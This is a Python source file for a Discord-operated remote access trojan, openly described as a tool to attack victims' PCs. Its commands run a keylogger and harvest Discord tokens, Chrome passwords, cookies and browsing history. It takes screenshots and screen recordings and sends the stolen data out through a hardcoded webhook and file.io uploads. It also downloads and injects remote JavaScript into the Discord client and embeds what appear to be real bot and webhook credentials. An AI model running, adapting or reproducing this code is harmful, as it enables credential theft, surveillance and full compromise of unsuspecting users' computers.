import discord 
import json 
import subprocess 
import asyncio 
import ctypes 
import os 
import logging 
import threading 
import requests 
import time 
import cv2 
import win32clipboard
import win32process
import win32con
import win32gui
import winreg
import re
import sys
import shutil
import pyautogui
import base64
import sqlite3
import win32crypt
import sqlite3
import psutil 
import zipfile 
import sounddevice as sd
import numpy as np
import subprocess as sp

from win32crypt import CryptUnprotectData
from re import findall
from Crypto.Cipher import AES
from Cryptodome.Cipher import AES
from urllib.request import urlopen, urlretrieve
from time import sleep
from mss import mss
from pynput.keyboard import Listener
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from requests import get
from scipy.io.wavfile import write
from discord_components import *

from discord.ext import commands
from discord_slash.context import ComponentContext
from discord_slash import SlashContext, SlashCommand
from discord_slash.model import ButtonStyle
from discord_slash.utils.manage_components import create_button, create_actionrow, create_select, create_select_option, wait_for_component

client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), description='Discord RAT to shits on pc\'s')
slash = SlashCommand(client, sync_commands=True)

ogdir = os.getcwd(); a = 1

token = 'ODk5OTA4ODQ3MzkxNjI5Mzcy.YW5nbA.NbISbTERXvWGnhZvVQbB0kqjVwU' #bot token that will you will control their pc thru
g = [888075171469078579] #guild id that the slash commands get registered on


@client.event
async def on_slash_command_error(ctx, error):
    if isinstance(error, discord.ext.commands.errors.MissingPermissions):
        await ctx.send('You do not have permission to execute this command')
    else:
        print(error)

@client.event
async def on_command_error(cmd, error):
    if isinstance(error, discord.ext.commands.errors.CommandNotFound):
        pass

async def activity(client):
    while True:
        if stop_threads:
            break
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        await client.change_presence(status=discord.Status.online, activity=discord.Game(f"Visiting: {window}"))
        sleep(1)

def uncritproc():
    import ctypes
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0

@client.event
async def on_ready():
    global channel_name
    DiscordComponents(client)
    number = 0
    with urlopen("http://ipinfo.io/json") as url:
        data = json.loads(url.read().decode())
        ip = data['ip']
        country = data['country']
        city = data['city']

    process2 = subprocess.Popen("wmic os get Caption", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
    wtype = process2.communicate()[0].decode().strip("Caption\n").strip()

    for x in client.get_all_channels():
        (on_ready.total).append(x.name)
    for y in range(len(on_ready.total)):
        if "session" in on_ready.total[y]:
            result = [e for e in re.split("[^0-9]", on_ready.total[y]) if e != '']
            biggest = max(map(int, result))
            number = biggest + 1
        else:
            pass  

    if number == 0:
        channel_name = "session-1"
        await client.guilds[0].create_text_channel(channel_name)
    else:
        channel_name = f"session-{number}"
        await client.guilds[0].create_text_channel(channel_name)
        
    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
    channel = client.get_channel(channel_.id)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    value1 = f"@here ✅ New session, opened **{channel_name}** | **{wtype}** | **{ip}, {country}/{city}**\n> Succesfully gained access to user **`{os.getlogin()}`**"
    if is_admin == True:
        await channel.send(f'{value1} with **`admin`** perms')
    elif is_admin == False:
        await channel.send(value1)
    game = discord.Game(f"Window logging stopped")
    await client.change_presence(status=discord.Status.online, activity=game)

on_ready.total = []

def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()

def MaxVolume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)

def MuteVolume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)


@slash.slash(name="kill", description="kills all inactive sessions", guild_ids=g)
async def kill_command(ctx: SlashContext):
    for y in range(len(on_ready.total)): 
        if "session" in on_ready.total[y]:
            channel_to_delete = discord.utils.get(client.get_all_channels(), name=on_ready.total[y])
            await channel_to_delete.delete()
        else:
            pass
    await ctx.send(f"Killed all the inactive sessions")


@slash.slash(name="exit", description="stop the program on victims pc", guild_ids=g)
async def exit_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        buttons = [
                create_button(
                    style=ButtonStyle.green,
                    label="✔"
                ),
                create_button(
                    style=ButtonStyle.red,
                    label="❌"
                ),
              ]
        action_row = create_actionrow(*buttons)
        await ctx.send("Are you sure you want to exit the program on your victims pc?", components=[action_row])

        res = await client.wait_for('button_click')
        if res.component.label == "✔":
            await ctx.send(content="Exited the program!", hidden=True)
            os._exit(0)
        else:
            await ctx.send(content="Cancelled the exit", hidden=True)


#Info
@slash.slash(name="info", description="gather info about the user", guild_ids=g)
async def info_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        url = 'http://ipinfo.io/json'
        response = urlopen(url)
        data = json.load(response)
        UsingVPN = json.load(urlopen("http://ip-api.com/json?fields=proxy"))['proxy']
        googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
        process = subprocess.Popen("wmic path softwarelicensingservice get OA3xOriginalProductKey", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
        wkey = process.communicate()[0].decode().strip("OA3xOriginalProductKeyn\n").strip()
        process2 = subprocess.Popen("wmic os get Caption", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
        wtype = process2.communicate()[0].decode().strip("Caption\n").strip()

        userdata = f"```fix\n------- {os.getlogin()} -------\nComputername: {os.getenv('COMPUTERNAME')}\nIP: {data['ip']}\nUsing VPN?: {UsingVPN}\nOrg: {data['org']}\nCity: {data['city']}\nRegion: {data['region']}\nPostal: {data['postal']}\nWindowskey: {wkey}\nWindows Type: {wtype}\n```**Map location: {googlemap}**\n"
        await ctx.send(userdata)


#Startkeylogger
@slash.slash(name="startkeylogger", description="start a key logger on their pc", guild_ids=g)
async def startKeyLogger_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        await ctx.send("Keylogger started")
        temp = os.getenv("TEMP")
        log_dir = temp
        logging.basicConfig(filename=(log_dir + r"\key_log.txt"),
                                level=logging.DEBUG, format='%(asctime)s: %(message)s')
        def keylog():
            def on_press(key):
                logging.info(str(key))
            with Listener(on_press=on_press) as listener:
                listener.join()
        import threading
        global test
        test = threading.Thread(target=keylog)
        test._running = True
        test.daemon = True
        test.start()


#Stopkeylogger
@slash.slash(name="stopkeylogger", description="stop the key logger", guild_ids=g)
async def stopKeyLogger_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        await ctx.send("Keylogger stopped")
        test._running = False
        


#Keylogdump
@slash.slash(name="KeyLogDump", description="dumb the keylogs", guild_ids=g)
async def KeyLogDump_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        await ctx.send("Dumping keylog")
        temp = os.getenv("TEMP")
        file_keys = temp + r"\key_log.txt"
        file = discord.File(file_keys, filename="key_log.txt")
        await ctx.channel.send( file=file)
        os.popen(f"del {file_keys}")
        os.system(r"del %temp%\output.txt /f")
        


#Discordtoken
@slash.slash(name="tokens", description="get all their discord tokens", guild_ids=g)
async def TokenExtractor_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        await ctx.send(f"extracting tokens. . .")
        tokens = []
        saved = ""
        paths = {
            'Discord': os.getenv('APPDATA') + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': os.getenv('APPDATA') + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': os.getenv('APPDATA') + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': os.getenv('APPDATA') + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': os.getenv('APPDATA') + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': os.getenv('APPDATA') + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': os.getenv('LOCALAPPDATA') + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': os.getenv('LOCALAPPDATA') + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': os.getenv('LOCALAPPDATA') + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': os.getenv('LOCALAPPDATA') + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': os.getenv('LOCALAPPDATA') + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': os.getenv('LOCALAPPDATA') + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': os.getenv('LOCALAPPDATA') + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': os.getenv('LOCALAPPDATA') + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': os.getenv('LOCALAPPDATA') + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': os.getenv('LOCALAPPDATA') + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': os.getenv('LOCALAPPDATA') + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': os.getenv('LOCALAPPDATA') + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': os.getenv('LOCALAPPDATA') + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': os.getenv('LOCALAPPDATA') + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': os.getenv('LOCALAPPDATA') + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': os.getenv('LOCALAPPDATA') + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }
        for source, path in paths.items():
            if not os.path.exists(path):
                continue
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in re.findall(regex, line):
                            tokens.append(token)
        for token in tokens:
            r = requests.get("https://discord.com/api/v9/users/@me", headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
                "Authorization": token
            })
            if r.status_code == 200:
                if token in saved:
                    continue
                saved += f"`{token}`\n\n"
        if saved != "":
            await ctx.send(f"**Token(s) succesfully grabbed:** \n{saved}")
        else:
            await ctx.send(f"**User didn't have any stored tokens**")


#Passwords test success kinda ig
@slash.slash(name="passwords", description="collects all saved Passwords hopefully", guild_ids=g)
async def Passwordextractor_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        await ctx.send(f"extracting passowords. . .")

        def get_master_key():
                with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                master_key = master_key[5:]
                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                return master_key

        def decrypt_payload(cipher, payload):
                return cipher.decrypt(payload)

        def generate_cipher(aes_key, iv):
                return AES.new(aes_key, AES.MODE_GCM, iv)
        def decrypt_password(buff, master_key):
                try:
                    iv = buff[3:15]
                    payload = buff[15:]
                    cipher = generate_cipher(master_key, iv)
                    decrypted_pass = decrypt_payload(cipher, payload)
                    decrypted_pass = decrypted_pass[:-16].decode()
                    return decrypted_pass
                except Exception as e:
                    return "Chrome < 80"
        master_key = get_master_key()
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
        shutil.copy2(login_db, "Loginvault.db")
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = decrypt_password(encrypted_password, master_key)
                if len(username) > 0:
                    temp = (os.getenv('TEMP'))
                    output = "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n"
                    f4 = open(temp + r"\passwords.txt", 'a')
                    f4.write(str(output))
                    f4.close()
        except Exception as e:
            pass
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
            file = discord.File(temp + r"\passwords.txt", filename="passwords.txt")
            await ctx.channel.send("[*] Command successfuly executed", file=file)
            os.system("del %temp%\passwords.txt /f")
        except Exception as e:
                pass


#history
@slash.slash(name="History", description="Gets browser history from chrome", guild_ids=g)
async def Historyextractor_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        await ctx.send("Gathering browser history for you")
        temp = (os.getenv('TEMP'))
        Username = (os.getenv('USERNAME'))
        shutil.rmtree(temp + r"\history12", ignore_errors=True)
        os.mkdir(temp + r"\history12")
        path_org = r""" "C:\Users\{}\AppData\Local\Google\Chrome\User Data\Default\History" """.format(Username)
        path_new = temp + r"\history12"
        copy_me_to_here = (("copy" + path_org + "\"{}\"" ).format(path_new))
        os.system(copy_me_to_here)
        con = sqlite3.connect(path_new + r"\history")
        cursor = con.cursor()
        cursor.execute("SELECT url FROM urls")
        urls = cursor.fetchall()
        for x in urls:
            done = ("".join(x))
            f4 = open(temp + r"\history12" + r"\history.txt", 'a')
            f4.write(str(done))
            f4.write(str("\n"))
            f4.close()
        con.close()
        file = discord.File(temp + r"\history12" + r"\history.txt", filename="history.txt")
        await ctx.send("Victim got caught", file=file)
        def deleteme() :
            path = "rmdir " + temp + r"\history12" + " /s /q"
            os.system(path)
        deleteme()


#stealer shit
@slash.slash(name="Stealer", description="Sends all passowords cookies and shit", guild_ids=g)
async def Stealer_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        await ctx.send("Sending all things via webhook to #stealer-info coz i am fricking noob...")
        class Hazard_Token_Grabber_V2:
            def __init__(self):
                self.webhook = "https://discord.com/api/webhooks/929010014251786241/as-TUxgaGxLcufOHQ_qHpI-t5qKEWn9u6c8R6vffA85x3i4imZbM2ivSbvN4-eKmMbwN"
                self.files = ""
                self.appdata = os.getenv("localappdata")
                self.roaming = os.getenv("appdata")
                self.tempfolder = os.getenv("temp")+"\\Hazard_Token_Grabber_V2"

                try:
                    os.mkdir(os.path.join(self.tempfolder))
                except Exception:
                    pass

                self.tokens = []
                self.saved = []

                if os.path.exists(os.getenv("appdata")+"\\BetterDiscord"):
                    self.bypass_better_discord()

                if not os.path.exists(self.appdata+'\\Google'):
                    self.files += f"**{os.getlogin()}** doesn't have google installed\n"
                else:
                    self.grabPassword()
                    self.grabCookies()
                self.grabTokens()
                self.screenshot()
                self.SendInfo()
                self.LogOut()
                try:
                    shutil.rmtree(self.tempfolder)
                except (PermissionError, FileExistsError):
                    pass

            def getheaders(self, token=None, content_type="application/json"):
                headers = {
                    "Content-Type": content_type,
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
                }
                if token:
                    headers.update({"Authorization": token})
                return headers

            def LogOut(self):
                for proc in psutil.process_iter():
                    if any(procstr in proc.name() for procstr in\
                    ['Discord', 'DiscordCanary', 'DiscordDevelopment', 'DiscordPTB']):
                        proc.kill()
                for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
                    for name in dirs:
                        if "discord_desktop_core-" in name:
                            try:
                                directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
                                os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
                            except FileNotFoundError:
                                pass
                            f = requests.get("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean").text.replace("%WEBHOOK_LINK%", self.webhook)
                            with open(directory_list, 'w', encoding="utf-8") as index_file:
                                index_file.write(f)
                for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
                    for name in files:
                        discord_file = os.path.join(root, name)
                        os.startfile(discord_file)

            def bypass_better_discord(self):
                bd = os.getenv("appdata")+"\\BetterDiscord\\data\\betterdiscord.asar"
                with open(bd, "rt", encoding="cp437") as f:
                    content = f.read()
                    content2 = content.replace("api/webhooks", "RdimoTheGoat")
                with open(bd, 'w'): pass
                with open(bd, "wt", encoding="cp437") as f:
                    f.write(content2)

            def get_master_key(self):
                with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
                    local_state = f.read()
                local_state = json.loads(local_state)

                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                master_key = master_key[5:]
                master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
                return master_key
    
            def decrypt_payload(self, cipher, payload):
                return cipher.decrypt(payload)
    
            def generate_cipher(self, aes_key, iv):
                return AES.new(aes_key, AES.MODE_GCM, iv)
    
            def decrypt_password(self, buff, master_key):
                try:
                    iv = buff[3:15]
                    payload = buff[15:]
                    cipher = self.generate_cipher(master_key, iv)
                    decrypted_pass = self.decrypt_payload(cipher, payload)
                    decrypted_pass = decrypted_pass[:-16].decode()
                    return decrypted_pass
                except:
                    return "Chrome < 80"
    
            def grabPassword(self):
                master_key = self.get_master_key()
                f = open(self.tempfolder+"\\Google Passwords.txt", "w", encoding="cp437", errors='ignore')
                f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
                login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
                try:
                    shutil.copy2(login_db, "Loginvault.db")
                except FileNotFoundError:
                    pass
                conn = sqlite3.connect("Loginvault.db")
                cursor = conn.cursor()
                try:
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for r in cursor.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = self.decrypt_password(encrypted_password, master_key)
                        if url != "":
                            f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
                except:
                    pass
                f.close()
                cursor.close()
                conn.close()
                try:
                    os.remove("Loginvault.db")
                except:
                    pass

            def grabCookies(self):
                master_key = self.get_master_key()
                f = open(self.tempfolder+"\\Google Cookies.txt", "w", encoding="cp437", errors='ignore')
                f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
                login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Network\\cookies'
                try:
                    shutil.copy2(login_db, "Loginvault.db")
                except FileNotFoundError:
                    pass
                conn = sqlite3.connect("Loginvault.db")
                cursor = conn.cursor()
                try:
                    cursor.execute("SELECT host_key, name, encrypted_value from cookies")
                    for r in cursor.fetchall():
                        Host = r[0]
                        user = r[1]
                        encrypted_cookie = r[2]
                        decrypted_cookie = self.decrypt_password(encrypted_cookie, master_key)
                        if Host != "":
                            f.write(f"Host: {Host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
                except:
                    pass
                f.close()
                cursor.close()
                conn.close()
                try:
                    os.remove("Loginvault.db")
                except:
                    pass

            def grabTokens(self):
                f = open(self.tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
                f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
                paths = {
                    'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
                    'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
                    'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
                    'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
                    'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
                    'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
                    'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
                    'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
                    'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
                    'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
                    'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
                    '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
                    'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
                    'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
                    'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
                    'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
                    'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
                    'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
                    'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
                    'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
                    'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
                    'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
                }

                for source, path in paths.items():
                    if not os.path.exists(path):
                     continue
                    for file_name in os.listdir(path):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                for token in findall(regex, line):
                                    self.tokens.append(token)
                for token in self.tokens:
                    r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
                    if r.status_code == 200:
                        if token in self.saved:
                            continue
                        self.saved.append(token)
                        j = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token)).json()
                        badges = ""
                        flags = j['flags']
                        if (flags == 1):
                            badges += "Staff, "
                        if (flags == 2):
                            badges += "Partner, "
                        if (flags == 4):
                            badges += "Hypesquad Event, "
                        if (flags == 8):
                            badges += "Green Bughunter, "
                        if (flags == 64):
                            badges += "Hypesquad Bravery, "
                        if (flags == 128):
                            badges += "HypeSquad Brillance, "
                        if (flags == 256):
                            badges += "HypeSquad Balance, "
                        if (flags == 512):
                            badges += "Early Supporter, "
                        if (flags == 16384):
                            badges += "Gold BugHunter, "
                        if (flags == 131072):
                            badges += "Verified Bot Developer, "
                        if (badges == ""):
                            badges = "None"

                        user = j["username"] + "#" + str(j["discriminator"])
                        email = j["email"]
                        phone = j["phone"] if j["phone"] else "No Phone Number attached"

                        url = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.gif'
                        try:
                            requests.get(url)
                        except:
                            url = url[:-4]

                        nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
                        has_nitro = False
                        has_nitro = bool(len(nitro_data) > 0)

                        billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
                
                        f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n[Avatar]({url})\n\n")
                f.close()

            def screenshot(self):
                image = pyautogui.screenshot()
                image.save(self.tempfolder + "\\Screenshot.png")

            def SendInfo(self):
                ip = country = city = region = googlemap = "None"
                try:
                    data = requests.get("http://ipinfo.io/json").json()
                    ip = data['ip']
                    city = data['city']     
                    country = data['country']
                    region = data['region']
                    googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
                except Exception:
                    pass
                temp = os.path.join(self.tempfolder)
                new = os.path.join(self.appdata, f'Hazard.V2-[{os.getlogin()}].zip')
                self.zip(temp, new)
                for dirname, _, files in os.walk(self.tempfolder):
                    for f in files:
                        self.files += f"\n{f}"
                n = 0
                for r, d, files in os.walk(self.tempfolder):
                    n+= len(files)
                    self.fileCount = f"{n} Files Found: "
                embed = {
                    "avatar_url":"https://cdn.discordapp.com/attachments/828047793619861557/891537255078985819/nedladdning_9.gif",
                    "embeds": [
                        {
                            "author": {
                                "name": "Hazard Token Grabber.V2",
                                "url": "https://github.com/Rdimo/Hazard-Token-Grabber-V2",
                                "icon_url": "https://cdn.discordapp.com/attachments/828047793619861557/891698193245560862/Hazard.gif"
                            },
                            "description": f"**{os.getlogin()}** Just ran Hazard Token Grabber.V2\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
                            "color": 16119101,

                            "thumbnail": {
                            "url": "https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Hazard.gif"
                            },       

                            "footer": {
                            "text": "©Rdimo#6969 https://github.com/Rdimo/Hazard-Token-Grabber-V2"
                            }
                        }
                    ]
                }
                requests.post(self.webhook, json=embed)
                requests.post(self.webhook, files={'upload_file': open(new,'rb')})

            def zip(self, src, dst):
                zipped_file = zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED)
                abs_src = os.path.abspath(src)
                for dirname, _, files in os.walk(src):
                    for filename in files:
                        absname = os.path.abspath(os.path.join(dirname, filename))
                        arcname = absname[len(abs_src) + 1:]
                        zipped_file.write(absname, arcname)
                zipped_file.close()

        if __name__ == "__main__":
            Hazard_Token_Grabber_V2()

#idk what is this shit
@slash.slash(name="windowstart", description="start the window logger", guild_ids=g)
async def windowstart_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        global stop_threads
        stop_threads = False

        threading.Thread(target=between_callback, args=(client,)).start()
        await ctx.send("Window logging for this session started")

#yea same here
@slash.slash(name="windowstop", description="stop window logger", guild_ids=g)
async def windowstop_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        global stop_threads
        stop_threads = True

        await ctx.send("Window logging for this session stopped")
        game = discord.Game(f"Window logging stopped")
        await client.change_presence(status=discord.Status.online, activity=game)


#screenshot
@slash.slash(name="screenshot", description="take a screenshot", guild_ids=g)
async def screenshot_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        temp = os.path.join(os.getenv('TEMP') + "\\monitor.png")
        with mss() as sct:
            sct.shot(output=temp)
        file = discord.File(temp, filename="monitor.png")
        await ctx.send("Screenshot taken!", file=file)
        os.remove(temp)


#streamscreen
@slash.slash(name="streamscreen", description="streams monitor", guild_ids=g)
async def StreamScreen_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        await ctx.send("Streaming Monitor...")
        temp = (os.getenv('TEMP'))
        hellos = temp + r"\hobos\hellos.txt"        
        if os.path.isfile(hellos):
           os.system(r"del %temp%\hobos\hellos.txt /f")
           os.system(r"RMDIR %temp%\hobos /s /q")      
        else:
            pass
        while True:
            with mss() as sct:
                sct.shot(output=os.path.join(os.getenv('TEMP') + r"\monitor.png"))
            path = (os.getenv('TEMP')) + r"\monitor.png"
            file = discord.File((path), filename="monitor.png")
            await ctx.send(file=file)
            temp = (os.getenv('TEMP'))
            hellos = temp + r"\hobos\hellos.txt"
            if os.path.isfile(hellos):
                break
            else:
                continue


#StopScreen
@slash.slash(name="StopScreen", description="Stops streaming monitor", guild_ids=g)
async def StopScreen_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        os.system(r"mkdir %temp%\hobos")
        os.system(r"echo hello>%temp%\hobos\hellos.txt")
        os.system(r"del %temp%\monitor.png /F")
        await ctx.send("Okay")


#Recordscreen
@slash.slash(name="Recordscreen", description="Records monitor for the given time", guild_ids=g)
async def RecordScreen_command(ctx: SlashContext,time):
    if ctx.channel.name == channel_name:
        await ctx.send("Record screen...")
        reclenth = float(time)
        input2 = 0
        while True:
            input2 = input2 + 1
            input3 = 0.045 * input2
            if input3 >= reclenth:
                break
            else:
                continue
        SCREEN_SIZE = (1920, 1080)
        fourcc = cv2.VideoWriter_fourcc(*"XVID")
        temp = (os.getenv('TEMP'))
        videeoo = temp + r"\output.avi"
        out = cv2.VideoWriter(videeoo, fourcc, 20.0, (SCREEN_SIZE))
        counter = 1
        while True:
            counter = counter + 1
            img = pyautogui.screenshot()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            out.write(frame)
            if counter >= input2:
                break
        out.release()
        temp = (os.getenv('TEMP'))
        check = temp + r"\output.avi"
        check2 = os.stat(check).st_size
        if check2 > 7340032:
            instruction = """curl -F file=@""" + '"' + check + '"' + """ https://file.io/?expires=1w"""
            await ctx.send("this may take some time becuase it is over 8 MB. please wait")
            string = subprocess.getoutput(instruction)
            import re
            output = re.search("key", string).start()
            output = output + 6
            output2 = output + 12
            boom = string[output:output2]   
            boom = r"https://file.io/" + boom
            await ctx.send("video download link: " + boom)
            await ctx.send("Screen recording sent successfully")
            os.system(r"del %temp%\output.avi /f")
        else:
            file = discord.File(check, filename="output.avi")
